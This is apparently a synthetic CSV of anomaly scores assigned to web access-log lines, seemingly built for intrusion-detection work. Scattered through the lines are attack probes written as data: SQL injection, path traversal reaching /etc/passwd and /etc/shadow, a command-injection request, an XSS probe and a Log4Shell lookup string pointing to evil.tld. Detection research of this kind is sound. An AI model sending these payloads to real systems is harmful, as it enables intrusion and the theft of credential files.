score_content,score_session,score_fused,line
5.792396545410156,,5.792396545410156,196.245.226.101 - - [10/Jan/2025:12:06:19 +0100] "GET /search?q=monitor HTTP/1.1" 200 1925 "https://twitter.com/" "curl/7.85.0"
4.427395820617676,,4.427395820617676,138.132.26.43 - - [10/Jan/2025:12:06:20 +0100] "POST /about HTTP/1.1" 200 13330 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
1.7280436754226685,,1.7280436754226685,253.189.52.33 - - [10/Jan/2025:12:06:22 +0100] "GET /about HTTP/1.1" 200 18626 "https://example.com/" "sqlmap/1.7.2#stable"
76.07022094726562,,76.07022094726562,251.21.198.168 - - [10/Jan/2025:12:06:24 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 5471 "-" "python-requests/2.31.0"
0.26516711711883545,,0.26516711711883545,154.62.108.30 - - [10/Jan/2025:12:06:24 +0100] "GET /wp-login.php HTTP/1.1" 201 3676 "https://www.google.com/" "nikto/2.5.0"
0.3382667303085327,,0.3382667303085327,14.223.69.199 - - [10/Jan/2025:12:06:24 +0100] "GET /index.html HTTP/1.1" 204 12301 "https://news.ycombinator.com/" "nikto/2.5.0"
11.367741584777832,,11.367741584777832,192.17.31.84 - - [10/Jan/2025:12:06:27 +0100] "GET /assets/app.css HTTP/1.1" 404 267 "https://www.google.com/" "nikto/2.5.0"
102.7229995727539,,102.7229995727539,82.240.94.191 - - [10/Jan/2025:12:06:27 +0100] "TRACE /server-status HTTP/1.1" 200 19277 "https://www.google.com/" "nikto/2.5.0"
76.05301666259766,,76.05301666259766,190.246.140.253 - - [10/Jan/2025:12:06:30 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 16790 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
42.03847885131836,,42.03847885131836,251.28.133.157 - - [10/Jan/2025:12:06:33 +0100] "DELETE /search?q=camera HTTP/1.1" 404 852 "https://www.google.com/" "curl/7.85.0"
5.860856533050537,,5.860856533050537,30.118.145.143 - - [10/Jan/2025:12:06:33 +0100] "GET /search?q=phone HTTP/1.1" 200 11594 "-" "python-requests/2.31.0"
3.264174461364746,,3.264174461364746,110.90.19.32 - - [10/Jan/2025:12:06:33 +0100] "POST /.env HTTP/1.1" 200 18978 "https://news.ycombinator.com/" "python-requests/2.31.0"
30.968889236450195,,30.968889236450195,138.41.28.179 - - [10/Jan/2025:12:06:36 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 10464 "https://twitter.com/" "python-requests/2.31.0"
1.5624229907989502,,1.5624229907989502,177.150.107.75 - - [10/Jan/2025:12:06:37 +0100] "GET /dashboard HTTP/1.1" 200 4955 "https://twitter.com/" "python-requests/2.31.0"
109.0041732788086,,109.0041732788086,72.153.98.59 - - [10/Jan/2025:12:06:38 +0100] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 17302 "https://twitter.com/" "dirb/2.22"
45.13800048828125,,45.13800048828125,252.219.169.34 - - [10/Jan/2025:12:06:41 +0100] "HEAD /.git/config HTTP/1.1" 200 8854 "https://twitter.com/" "dirb/2.22"
0.2461281269788742,,0.2461281269788742,208.131.109.50 - - [10/Jan/2025:12:06:43 +0100] "GET /assets/app.js HTTP/1.1" 200 4165 "https://example.com/" "nikto/2.5.0"
30.93244743347168,,30.93244743347168,4.44.253.196 - - [10/Jan/2025:12:06:44 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 3073 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
37.87580490112305,,37.87580490112305,176.212.3.221 - - [10/Jan/2025:12:06:46 +0100] "DELETE /about HTTP/1.1" 403 1480 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
78.07251739501953,,78.07251739501953,210.153.72.135 - - [10/Jan/2025:12:06:47 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 8929 "-" "curl/7.85.0"
101.72223663330078,,101.72223663330078,44.5.234.220 - - [10/Jan/2025:12:06:49 +0100] "TRACE /.env HTTP/1.1" 200 4422 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
16.920866012573242,,16.920866012573242,247.176.117.195 - - [10/Jan/2025:12:06:52 +0100] "PUT /search?q=laptop HTTP/1.1" 200 9260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.39395141601562,,70.39395141601562,240.103.94.143 - - [10/Jan/2025:12:06:52 +0100] "OPTIONS /../../etc/passwd HTTP/1.1" 200 8976 "https://www.google.com/" "sqlmap/1.7.2#stable"
106.99215698242188,,106.99215698242188,227.168.233.244 - - [10/Jan/2025:12:06:53 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 14438 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.364016532897949,,4.364016532897949,120.62.45.66 - - [10/Jan/2025:12:06:56 +0100] "POST /contact HTTP/1.1" 204 16713 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
48.54560470581055,,48.54560470581055,86.62.105.93 - - [10/Jan/2025:12:06:57 +0100] "HEAD /profile HTTP/1.1" 302 18342 "-" "curl/7.85.0"
16.85332489013672,,16.85332489013672,124.227.239.222 - - [10/Jan/2025:12:06:57 +0100] "PUT /search?q=headphones HTTP/1.1" 200 9190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2855569124221802,,0.2855569124221802,243.147.3.217 - - [10/Jan/2025:12:06:57 +0100] "GET /assets/app.js HTTP/1.1" 200 16220 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
5.825805187225342,,5.825805187225342,198.180.146.73 - - [10/Jan/2025:12:06:58 +0100] "GET /api/product?id=123 HTTP/1.1" 200 3149 "https://example.com/" "dirb/2.22"
0.10410971194505692,,0.10410971194505692,244.177.203.90 - - [10/Jan/2025:12:07:01 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 5070 "-" "nikto/2.5.0"
5.758564472198486,,5.758564472198486,158.1.34.204 - - [10/Jan/2025:12:07:03 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 8045 "https://example.com/" "dirb/2.22"
16.92183494567871,,16.92183494567871,105.5.159.20 - - [10/Jan/2025:12:07:05 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 5676 "https://www.google.com/" "curl/7.85.0"
107.08708953857422,,107.08708953857422,126.241.225.53 - - [10/Jan/2025:12:07:07 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 2301 "https://example.com/" "dirb/2.22"
5.867483139038086,,5.867483139038086,3.222.60.230 - - [10/Jan/2025:12:07:10 +0100] "GET /search?q=phone HTTP/1.1" 200 13759 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
584.6486206054688,,584.6486206054688,195.14.104.47 - - [10/Jan/2025:12:07:12 +0100] "PUT /search?q=headphones HTTP/1.1" 500 423 "https://example.com/" "nikto/2.5.0"
2.3419840335845947,,2.3419840335845947,46.34.55.60 - - [10/Jan/2025:12:07:13 +0100] "GET /assets/app.js HTTP/1.1" 302 16598 "-" "Wget/1.21.2 (linux-gnu)"
0.29097241163253784,,0.29097241163253784,19.142.42.112 - - [10/Jan/2025:12:07:15 +0100] "GET /assets/app.js HTTP/1.1" 200 18256 "https://news.ycombinator.com/" "dirb/2.22"
26.777624130249023,,26.777624130249023,141.179.206.15 - - [10/Jan/2025:12:07:18 +0100] "DELETE /profile HTTP/1.1" 200 14517 "https://example.com/" "python-requests/2.31.0"
46.31346130371094,,46.31346130371094,195.113.29.205 - - [10/Jan/2025:12:07:19 +0100] "HEAD /server-status HTTP/1.1" 200 12503 "https://news.ycombinator.com/" "dirb/2.22"
71.84297943115234,,71.84297943115234,73.116.82.22 - - [10/Jan/2025:12:07:20 +0100] "OPTIONS /logout HTTP/1.1" 200 5235 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.803998947143555,,26.803998947143555,60.179.45.179 - - [10/Jan/2025:12:07:21 +0100] "DELETE /login HTTP/1.1" 200 2130 "https://www.google.com/" "sqlmap/1.7.2#stable"
568.1027221679688,,568.1027221679688,44.135.147.78 - - [10/Jan/2025:12:07:22 +0100] "GET /index.html HTTP/1.1" 500 757 "https://news.ycombinator.com/" "curl/7.85.0"
107.06369018554688,,107.06369018554688,14.109.178.22 - - [10/Jan/2025:12:07:22 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 11900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.8523006439209,,26.8523006439209,209.226.222.52 - - [10/Jan/2025:12:07:22 +0100] "DELETE /about HTTP/1.1" 200 18481 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
8.54027271270752,,8.54027271270752,34.97.36.122 - - [10/Jan/2025:12:07:24 +0100] "POST /search?q=monitor HTTP/1.1" 200 12931 "https://twitter.com/" "dirb/2.22"
5.8577375411987305,,5.8577375411987305,232.173.163.171 - - [10/Jan/2025:12:07:27 +0100] "GET /search?q=laptop HTTP/1.1" 200 17524 "https://twitter.com/" "python-requests/2.31.0"
0.35907605290412903,,0.35907605290412903,212.17.234.98 - - [10/Jan/2025:12:07:29 +0100] "GET /index.html HTTP/1.1" 200 16344 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.76904296875,,50.76904296875,184.214.91.224 - - [10/Jan/2025:12:07:31 +0100] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12452 "https://www.google.com/" "dirb/2.22"
4.329356670379639,,4.329356670379639,168.92.17.97 - - [10/Jan/2025:12:07:32 +0100] "POST /profile HTTP/1.1" 200 3090 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2670955955982208,,0.2670955955982208,184.43.143.172 - - [10/Jan/2025:12:07:32 +0100] "GET /assets/app.css HTTP/1.1" 200 17399 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.2323782444000244,,3.2323782444000244,216.229.1.85 - - [10/Jan/2025:12:07:34 +0100] "POST /.env HTTP/1.1" 200 8299 "-" "nikto/2.5.0"
0.2629034221172333,,0.2629034221172333,64.68.108.163 - - [10/Jan/2025:12:07:34 +0100] "GET /assets/app.css HTTP/1.1" 200 15851 "https://www.google.com/" "curl/7.85.0"
3.0430731773376465,,3.0430731773376465,213.19.100.28 - - [10/Jan/2025:12:07:37 +0100] "POST /.git/config HTTP/1.1" 200 14572 "https://twitter.com/" "curl/7.85.0"
28.781982421875,,28.781982421875,254.27.190.150 - - [10/Jan/2025:12:07:37 +0100] "DELETE /dashboard HTTP/1.1" 301 19606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30.88953971862793,,30.88953971862793,21.102.246.231 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 200 10336 "https://example.com/" "sqlmap/1.7.2#stable"
42.62519073486328,,42.62519073486328,125.232.214.36 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 429 1305 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.266153812408447,,4.266153812408447,223.62.216.243 - - [10/Jan/2025:12:07:40 +0100] "POST /api/products HTTP/1.1" 200 5101 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7143077850341797,,1.7143077850341797,17.18.172.80 - - [10/Jan/2025:12:07:40 +0100] "GET /login HTTP/1.1" 200 13644 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.88295555114746,,16.88295555114746,235.191.155.53 - - [10/Jan/2025:12:07:42 +0100] "GET /search?q=headphones HTTP/1.1" 404 304 "-" "curl/7.85.0"
12.733939170837402,,12.733939170837402,144.234.101.1 - - [10/Jan/2025:12:07:43 +0100] "PUT /contact HTTP/1.1" 200 11957 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.10195059329271317,,0.10195059329271317,26.117.43.197 - - [10/Jan/2025:12:07:46 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 4450 "https://www.google.com/" "python-requests/2.31.0"
4.36195182800293,,4.36195182800293,60.10.206.94 - - [10/Jan/2025:12:07:48 +0100] "POST /logout HTTP/1.1" 200 1464 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
16.934953689575195,,16.934953689575195,146.130.145.208 - - [10/Jan/2025:12:07:50 +0100] "PUT /search?q=camera HTTP/1.1" 200 13673 "https://example.com/" "sqlmap/1.7.2#stable"
42.03089141845703,,42.03089141845703,217.120.231.136 - - [10/Jan/2025:12:07:52 +0100] "DELETE /search?q=camera HTTP/1.1" 404 1298 "https://news.ycombinator.com/" "dirb/2.22"
57.686805725097656,,57.686805725097656,146.20.9.87 - - [10/Jan/2025:12:07:54 +0100] "HEAD /login HTTP/1.1" 403 100 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
18.974407196044922,,18.974407196044922,198.119.145.110 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/product?id=123 HTTP/1.1" 302 4046 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
18.972946166992188,,18.972946166992188,97.39.139.241 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 3569 "https://example.com/" "dirb/2.22"
102.8324966430664,,102.8324966430664,184.246.225.176 - - [10/Jan/2025:12:07:59 +0100] "TRACE /profile HTTP/1.1" 200 3327 "https://example.com/" "dirb/2.22"
5.852766036987305,,5.852766036987305,163.155.240.86 - - [10/Jan/2025:12:08:00 +0100] "GET /search?q=laptop HTTP/1.1" 200 15687 "https://www.google.com/" "curl/7.85.0"
1.5402439832687378,,1.5402439832687378,133.178.125.94 - - [10/Jan/2025:12:08:03 +0100] "GET /phpmyadmin HTTP/1.1" 204 8869 "https://www.google.com/" "sqlmap/1.7.2#stable"
76.0746078491211,,76.0746078491211,85.213.208.15 - - [10/Jan/2025:12:08:03 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17015 "-" "sqlmap/1.7.2#stable"
78.07598114013672,,78.07598114013672,16.242.221.193 - - [10/Jan/2025:12:08:04 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 301 13482 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.774533271789551,,7.774533271789551,221.106.175.44 - - [10/Jan/2025:12:08:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 301 14812 "https://news.ycombinator.com/" "dirb/2.22"
26.773317337036133,,26.773317337036133,188.95.82.106 - - [10/Jan/2025:12:08:04 +0100] "DELETE /contact HTTP/1.1" 204 16236 "https://news.ycombinator.com/" "nikto/2.5.0"
0.26123926043510437,,0.26123926043510437,230.130.197.218 - - [10/Jan/2025:12:08:05 +0100] "GET /assets/app.css HTTP/1.1" 200 15256 "https://news.ycombinator.com/" "nikto/2.5.0"
28.852100372314453,,28.852100372314453,182.228.158.70 - - [10/Jan/2025:12:08:08 +0100] "DELETE /contact HTTP/1.1" 304 11749 "https://www.google.com/" "curl/7.85.0"
1.661986231803894,,1.661986231803894,149.224.246.61 - - [10/Jan/2025:12:08:08 +0100] "GET /contact HTTP/1.1" 200 293 "https://example.com/" "nikto/2.5.0"
45.368045806884766,,45.368045806884766,94.143.137.89 - - [10/Jan/2025:12:08:10 +0100] "HEAD /.env HTTP/1.1" 204 18961 "-" "dirb/2.22"
78.07341766357422,,78.07341766357422,77.75.44.144 - - [10/Jan/2025:12:08:10 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 304 8144 "-" "Wget/1.21.2 (linux-gnu)"
1.6892547607421875,,1.6892547607421875,240.218.25.128 - - [10/Jan/2025:12:08:12 +0100] "GET /logout HTTP/1.1" 200 16313 "https://news.ycombinator.com/" "curl/7.85.0"
2.293616533279419,,2.293616533279419,36.102.175.159 - - [10/Jan/2025:12:08:12 +0100] "GET /assets/app.css HTTP/1.1" 301 11274 "https://www.google.com/" "dirb/2.22"
12.772717475891113,,12.772717475891113,193.88.154.82 - - [10/Jan/2025:12:08:12 +0100] "PUT /about HTTP/1.1" 201 5306 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
33.010894775390625,,33.010894775390625,74.56.170.243 - - [10/Jan/2025:12:08:12 +0100] "DELETE /search?q=router HTTP/1.1" 302 8972 "https://news.ycombinator.com/" "dirb/2.22"
14.805028915405273,,14.805028915405273,205.238.34.33 - - [10/Jan/2025:12:08:14 +0100] "PUT /logout HTTP/1.1" 301 9605 "https://example.com/" "python-requests/2.31.0"
1.8815631866455078,,1.8815631866455078,152.48.25.184 - - [10/Jan/2025:12:08:17 +0100] "GET / HTTP/1.1" 204 11180 "https://twitter.com/" "dirb/2.22"
19.01289176940918,,19.01289176940918,131.175.60.114 - - [10/Jan/2025:12:08:18 +0100] "PUT /api/product?id=123 HTTP/1.1" 304 8504 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
109.12934875488281,,109.12934875488281,24.121.37.156 - - [10/Jan/2025:12:08:18 +0100] "TRACE /api/product?id=123 HTTP/1.1" 301 18891 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.14270338416099548,,0.14270338416099548,121.116.95.241 - - [10/Jan/2025:12:08:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17051 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.3653680682182312,,0.3653680682182312,10.87.150.237 - - [10/Jan/2025:12:08:22 +0100] "GET /index.html HTTP/1.1" 200 18730 "https://www.google.com/" "dirb/2.22"
57.735172271728516,,57.735172271728516,88.76.35.102 - - [10/Jan/2025:12:08:24 +0100] "HEAD /admin HTTP/1.1" 400 24 "https://www.google.com/" "dirb/2.22"
46.39735794067383,,46.39735794067383,86.180.251.188 - - [10/Jan/2025:12:08:24 +0100] "HEAD /api/products HTTP/1.1" 200 11431 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.773457050323486,,5.773457050323486,62.84.9.253 - - [10/Jan/2025:12:08:24 +0100] "GET /search?q=headphones HTTP/1.1" 200 11605 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.79135513305664,,12.79135513305664,213.145.55.33 - - [10/Jan/2025:12:08:27 +0100] "PUT /about HTTP/1.1" 200 546 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.324063241481781,,0.324063241481781,75.77.52.175 - - [10/Jan/2025:12:08:27 +0100] "GET /index.html HTTP/1.1" 200 5530 "https://www.google.com/" "sqlmap/1.7.2#stable"
12.937117576599121,,12.937117576599121,80.184.3.204 - - [10/Jan/2025:12:08:30 +0100] "GET / HTTP/1.1" 403 1227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
76.01142120361328,,76.01142120361328,229.29.14.142 - - [10/Jan/2025:12:08:30 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 7193 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.258963584899902,,4.258963584899902,119.120.172.57 - - [10/Jan/2025:12:08:33 +0100] "POST /api/products HTTP/1.1" 200 2296 "-" "sqlmap/1.7.2#stable"
3.005082130432129,,3.005082130432129,87.232.4.195 - - [10/Jan/2025:12:08:36 +0100] "POST /.git/config HTTP/1.1" 200 2860 "https://twitter.com/" "nikto/2.5.0"
2.3064820766448975,,2.3064820766448975,227.43.167.139 - - [10/Jan/2025:12:08:39 +0100] "GET /assets/app.css HTTP/1.1" 302 11841 "https://example.com/" "curl/7.85.0"
75.98101043701172,,75.98101043701172,174.99.79.23 - - [10/Jan/2025:12:08:42 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 19502 "https://example.com/" "dirb/2.22"
14.81787395477295,,14.81787395477295,19.135.120.132 - - [10/Jan/2025:12:08:43 +0100] "PUT /logout HTTP/1.1" 301 13673 "https://www.google.com/" "curl/7.85.0"
27.925823211669922,,27.925823211669922,205.190.106.32 - - [10/Jan/2025:12:08:43 +0100] "PUT /search?q=camera HTTP/1.1" 401 853 "https://example.com/" "sqlmap/1.7.2#stable"
7.894350051879883,,7.894350051879883,237.188.25.146 - - [10/Jan/2025:12:08:46 +0100] "GET /search?q=router HTTP/1.1" 302 11053 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2571667432785034,,0.2571667432785034,251.176.50.68 - - [10/Jan/2025:12:08:49 +0100] "GET /assets/app.js HTTP/1.1" 200 7260 "-" "curl/7.85.0"
10.684200286865234,,10.684200286865234,105.131.13.152 - - [10/Jan/2025:12:08:51 +0100] "POST /search?q=ssd HTTP/1.1" 304 7135 "https://www.google.com/" "nikto/2.5.0"
71.88298797607422,,71.88298797607422,150.124.223.240 - - [10/Jan/2025:12:08:52 +0100] "OPTIONS /login HTTP/1.1" 200 7284 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.04932403564453,,107.04932403564453,190.36.20.249 - - [10/Jan/2025:12:08:53 +0100] "TRACE /search?q=camera HTTP/1.1" 200 11256 "https://twitter.com/" "sqlmap/1.7.2#stable"
2.4540727138519287,,2.4540727138519287,173.133.234.181 - - [10/Jan/2025:12:08:54 +0100] "GET /index.html HTTP/1.1" 304 226 "https://www.google.com/" "sqlmap/1.7.2#stable"
11.298262596130371,,11.298262596130371,114.157.120.65 - - [10/Jan/2025:12:08:56 +0100] "PUT /../../etc/passwd HTTP/1.1" 200 10649 "https://www.google.com/" "sqlmap/1.7.2#stable"
1.9112968444824219,,1.9112968444824219,173.118.116.201 - - [10/Jan/2025:12:08:58 +0100] "GET / HTTP/1.1" 200 18334 "https://example.com/" "python-requests/2.31.0"
46.4064826965332,,46.4064826965332,74.72.31.201 - - [10/Jan/2025:12:09:01 +0100] "HEAD /api/products HTTP/1.1" 200 14456 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.89374577999115,,1.89374577999115,123.150.20.85 - - [10/Jan/2025:12:09:03 +0100] "GET / HTTP/1.1" 200 12147 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
52.7368278503418,,52.7368278503418,59.89.44.147 - - [10/Jan/2025:12:09:03 +0100] "HEAD /search?q=laptop HTTP/1.1" 302 18559 "https://example.com/" "dirb/2.22"
107.02484893798828,,107.02484893798828,115.23.80.31 - - [10/Jan/2025:12:09:05 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 201 10315 "https://example.com/" "sqlmap/1.7.2#stable"
1.8844510316848755,,1.8844510316848755,202.176.216.159 - - [10/Jan/2025:12:09:06 +0100] "GET / HTTP/1.1" 200 9309 "https://twitter.com/" "nikto/2.5.0"
48.61408615112305,,48.61408615112305,2.73.217.178 - - [10/Jan/2025:12:09:09 +0100] "HEAD /login HTTP/1.1" 304 11945 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
1.9073814153671265,,1.9073814153671265,109.115.44.67 - - [10/Jan/2025:12:09:09 +0100] "GET / HTTP/1.1" 200 16849 "https://news.ycombinator.com/" "python-requests/2.31.0"
52.72029113769531,,52.72029113769531,60.222.186.26 - - [10/Jan/2025:12:09:12 +0100] "HEAD /search?q=monitor HTTP/1.1" 304 11448 "-" "nikto/2.5.0"
5.753720283508301,,5.753720283508301,131.172.231.197 - - [10/Jan/2025:12:09:13 +0100] "GET /search?q=headphones HTTP/1.1" 200 5883 "-" "sqlmap/1.7.2#stable"
26.686309814453125,,26.686309814453125,26.84.129.224 - - [10/Jan/2025:12:09:13 +0100] "DELETE /dashboard HTTP/1.1" 200 1228 "https://news.ycombinator.com/" "dirb/2.22"
102.79806518554688,,102.79806518554688,46.132.124.204 - - [10/Jan/2025:12:09:16 +0100] "TRACE /dashboard HTTP/1.1" 200 10400 "https://news.ycombinator.com/" "python-requests/2.31.0"
7.850668430328369,,7.850668430328369,123.222.209.95 - - [10/Jan/2025:12:09:18 +0100] "GET /search?q=headphones HTTP/1.1" 304 11359 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
46.51887512207031,,46.51887512207031,41.114.252.16 - - [10/Jan/2025:12:09:18 +0100] "HEAD /login HTTP/1.1" 204 9896 "https://twitter.com/" "python-requests/2.31.0"
16.949907302856445,,16.949907302856445,236.213.171.254 - - [10/Jan/2025:12:09:21 +0100] "PUT /search?q=laptop HTTP/1.1" 200 19147 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
107.0537109375,,107.0537109375,50.193.16.122 - - [10/Jan/2025:12:09:22 +0100] "TRACE /search?q=router HTTP/1.1" 200 12706 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.887819290161133,,30.887819290161133,71.141.149.111 - - [10/Jan/2025:12:09:23 +0100] "DELETE /search?q=headphones HTTP/1.1" 200 9816 "https://twitter.com/" "dirb/2.22"
73.72416687011719,,73.72416687011719,130.66.214.208 - - [10/Jan/2025:12:09:24 +0100] "OPTIONS /server-status HTTP/1.1" 304 2830 "https://www.google.com/" "python-requests/2.31.0"
10.592101097106934,,10.592101097106934,76.11.57.189 - - [10/Jan/2025:12:09:24 +0100] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 304 4993 "-" "nikto/2.5.0"
30.964048385620117,,30.964048385620117,50.101.201.68 - - [10/Jan/2025:12:09:24 +0100] "DELETE /api/product?id=123 HTTP/1.1" 204 11799 "https://www.google.com/" "nikto/2.5.0"
46.4430046081543,,46.4430046081543,22.39.234.141 - - [10/Jan/2025:12:09:26 +0100] "HEAD /contact HTTP/1.1" 200 3834 "https://news.ycombinator.com/" "python-requests/2.31.0"
